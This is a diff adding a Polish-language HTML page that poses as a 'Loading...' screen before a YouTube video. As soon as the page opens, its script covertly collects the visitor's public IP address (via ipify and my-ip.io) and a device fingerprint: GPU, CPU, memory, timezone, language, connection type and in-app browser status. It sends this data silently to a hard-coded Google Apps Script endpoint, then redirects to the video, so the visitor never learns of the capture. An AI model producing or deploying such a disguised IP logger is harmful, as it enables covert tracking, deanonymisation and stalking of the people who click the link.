@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ładowanie...</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <script>
+        // ⚙️ KONFIGURACJA - TUTAJ WPISZ SWOJE DANE!
+        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzhCFh2H-LiQWzjzSknJLiXuU4uX6J5JfV42LYFNPCw2vv423GT8Wjb0rR_Hcd-3bx9HA/exec"; // WKLEJ SWÓJ URL Z APPS SCRIPT
+        const VIDEO_ID = "uflGpLt6ZF0"; // ID FILMU YOUTUBE (możesz zmienić)
+        
+        // ============================================
+        // FUNKCJE ZBIERAJĄCE DANE
+        // ============================================
+        
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'unknown';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!debugInfo) return 'unknown';
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch(e) {
+                return 'error';
+            }
+        }
+        
+        function getCPU() {
+            return navigator.hardwareConcurrency || 'unknown';
+        }
+        
+        function getMemory() {
+            return navigator.deviceMemory || 'unknown';
+        }
+        
+        function getLanguage() {
+            return navigator.language || navigator.userLanguage || 'unknown';
+        }
+        
+        function getPlatform() {
+            return navigator.platform || 'unknown';
+        }
+        
+        function getTimezone() {
+            try {
+                return Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+            } catch(e) {
+                return 'unknown';
+            }
+        }
+        
+        function getConnectionType() {
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!conn) return 'unknown';
+                return conn.effectiveType || conn.type || 'unknown';
+            } catch(e) {
+                return 'unknown';
+            }
+        }
+        
+        function getPluginsCount() {
+            try {
+                return navigator.plugins ? navigator.plugins.length : 0;
+            } catch(e) {
+                return 0;
+            }
+        }
+        
+        function getColorDepth() {
+            return screen.colorDepth || 'unknown';
+        }
+        
+        function isInApp() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('instagram') || ua.includes('fb') || ua.includes('fban') || ua.includes('messenger')) {
+                return 1;
+            }
+            return 0;
+        }
+        
+        function getXFF() {
+            // Uwaga: JavaScript nie ma dostępu do nagłówka X-Forwarded-For
+            // Zostawiamy jako 'unknown' lub możemy spróbować przez API
+            return 'unknown';
+        }
+        
+        // 🌐 Pobieranie IP przez zewnętrzne API
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch(e) {
+                // Próbuj drugie API jeśli pierwsze nie działa
+                try {
+                    const response2 = await fetch('https://api.my-ip.io/ip.json');
+                    const data2 = await response2.json();
+                    return data2.ip;
+                } catch(e2) {
+                    return 'unknown';
+                }
+            }
+        }
+        
+        // 📝 Zbieranie wszystkich danych
+        async function collectData() {
+            const ip = await getIP();
+            
+            return {
+                ip: ip,
+                userAgent: navigator.userAgent,
+                gpu: getGPU(),
+                cpu: getCPU(),
+                memory: getMemory(),
+                language: getLanguage(),
+                platform: getPlatform(),
+                timezone: getTimezone(),
+                connectionType: getConnectionType(),
+                pluginsCount: getPluginsCount(),
+                colorDepth: getColorDepth(),
+                inApp: isInApp(),
+                xff: getXFF(),
+                videoId: VIDEO_ID
+            };
+        }
+        
+        // 💾 Zapis do Google Sheets
+        async function saveToGoogleSheets(data) {
+            try {
+                const response = await fetch(GOOGLE_SHEETS_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Ważne dla Google Apps Script!
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                console.log('✅ Dane wysłane do Google Sheets');
+            } catch(e) {
+                console.error('❌ Błąd wysyłania:', e);
+            }
+        }
+        
+        // 🚀 Główna funkcja
+        async function main() {
+            console.log('Zbieranie danych...');
+            const data = await collectData();
+            console.log('Dane zebrane:', data);
+            
+            await saveToGoogleSheets(data);
+            console.log('Przekierowanie na YouTube...');
+            
+            // Przekierowanie na YouTube
+            window.location.href = 'https://www.youtube.com/watch?v=' + VIDEO_ID;
+        }
+        
+        // Uruchom
+        main();
+    </script>
+</body>
+</html>
